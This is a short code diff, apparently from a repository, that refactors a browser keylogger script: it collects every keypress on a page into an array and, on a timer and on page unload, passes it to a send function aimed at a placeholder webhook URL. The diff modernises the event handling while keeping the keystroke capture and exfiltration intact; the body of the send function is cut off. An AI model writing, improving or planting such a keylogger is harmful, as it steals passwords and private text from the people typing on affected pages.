@@ -14,16 +14,14 @@
     let webhook = "WEBHOOK-URL";
     let delay = 5000; // in Milliseconds
     let data = [];
-    document.onkeypress = function(e) {
-        data.push(e.key);
-    }
+    window.addEventListener('keypress', e => data.push(e.key));
     let interval = setInterval(function() {
         send();
     }, delay);
-    window.unload = function() {
+    window.addEventListener('unload', e => {
         clearInterval(interval);
         send();
-    }
+    });
     function send() {
         if (data.length === 0) {
             return;
